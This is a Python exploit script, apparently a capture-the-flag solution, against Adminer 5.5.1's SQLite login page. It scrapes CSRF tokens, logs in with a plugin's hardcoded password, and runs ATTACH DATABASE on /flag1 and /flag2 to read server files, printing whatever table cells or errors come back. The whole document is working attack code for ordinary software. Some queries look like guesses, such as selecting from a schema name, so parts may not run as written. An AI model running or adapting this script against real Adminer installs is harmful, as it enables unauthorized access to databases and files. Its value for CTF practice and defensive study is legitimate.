#!/usr/bin/env python3
"""
vrana/adminer 5.5.1 — SQLite exploit (PHP 8.4)

Login bypass via sqlite.php + login-password-less plugin with hardcoded
password "YOUR_PASSWORD_HERE". Execute SQL to read /flag1 via ATTACH DATABASE.
"""
import sys
import re
import requests


def main():
    if len(sys.argv) < 2:
        print("Usage: exploit <challenge_host>")
        sys.exit(1)

    challenge = sys.argv[1]
    base_url = f"http://{challenge}"
    url = f"{base_url}/vendor/vrana/adminer/adminer/sqlite.php"

    s = requests.Session()

    # Step 1: Get login page from sqlite.php
    r = s.get(url, timeout=10)
    m = re.search(r"name='token'\s+value='(\d+:\d+)'", r.text)
    token = m.group(1) if m else ""

    # Step 2: Login with SQLite + hardcoded password
    r = s.post(url, data={
        'auth[driver]': 'sqlite', 'auth[server]': '', 'auth[username]': '',
        'auth[password]': 'YOUR_PASSWORD_HERE', 'auth[db]': '', 'auth[permanent]': '1',
        'token': token,
    }, timeout=10, allow_redirects=True)

    if 'Logged as' not in r.text:
        print("[-] Login failed", file=sys.stderr)
        return

    # Step 3: Access SQL page - must use ?sqlite=&username= to maintain session
    r = s.get(f"{url}?sqlite=&username=", timeout=10)
    if 'Logged as' not in r.text:
        print("[-] Session lost", file=sys.stderr)
        return

    m = re.search(r"name='token'\s+value='(\d+:\d+)'", r.text)
    token = m.group(1) if m else ""

    # Step 4: Try to execute SQL to read /flag1
    sql_endpoint = f"{url}?sqlite=&username=&sql="

    sqls = [
        "ATTACH DATABASE '/flag1' AS flagdb;",
    ]
    for sql in sqls:
        m = re.search(r"name='token'\s+value='(\d+:\d+)'", r.text)
        token = m.group(1) if m else ""
        r = s.post(sql_endpoint, data={'sql': sql, 'token': token}, timeout=10, allow_redirects=True)
        err = re.search(r"class='error'>(.*?)</div>", r.text)
        if err:
            print(f"[!] {sql[:50]}... → {err.group(1)}", file=sys.stderr)

    # Step 5: Try SELECT from flagdb
    m = re.search(r"name='token'\s+value='(\d+:\d+)'", r.text)
    token = m.group(1) if m else ""
    r = s.post(sql_endpoint, data={'sql': "SELECT * FROM flagdb;", 'token': token}, timeout=10, allow_redirects=True)

    for td in re.findall(r'<td[^>]*>(.*?)</td>', r.text, re.DOTALL):
        clean = re.sub(r'<[^>]+>', '', td).strip()
        if clean and len(clean) > 3:
            print(f"FLAG1: {clean}")

    # Also check for error that might contain flag
    err = re.search(r"class='error'>(.*?)</div>", r.text)
    if err:
        content = err.group(1)
        if 'LOCAL_TEST_FLAG' in content or 'flag{' in content or 'HITCON' in content:
            print(f"FLAG1: {content}")

    # Step 6: Try /flag2 via ATTACH
    m = re.search(r"name='token'\s+value='(\d+:\d+)'", r.text)
    token = m.group(1) if m else ""
    r = s.post(sql_endpoint, data={'sql': "ATTACH DATABASE '/flag2' AS flag2db;", 'token': token}, timeout=10, allow_redirects=True)
    err = re.search(r"class='error'>(.*?)</div>", r.text)
    if err:
        print(f"[!] ATTACH flag2: {err.group(1)}", file=sys.stderr)

    # Try reading flag2 if attached
    m = re.search(r"name='token'\s+value='(\d+:\d+)'", r.text)
    token = m.group(1) if m else ""
    r = s.post(sql_endpoint, data={'sql': "SELECT * FROM flag2db;", 'token': token}, timeout=10, allow_redirects=True)
    for td in re.findall(r'<td[^>]*>(.*?)</td>', r.text, re.DOTALL):
        clean = re.sub(r'<[^>]+>', '', td).strip()
        if clean and len(clean) > 3:
            print(f"FLAG2: {clean}")


if __name__ == '__main__':
    main()
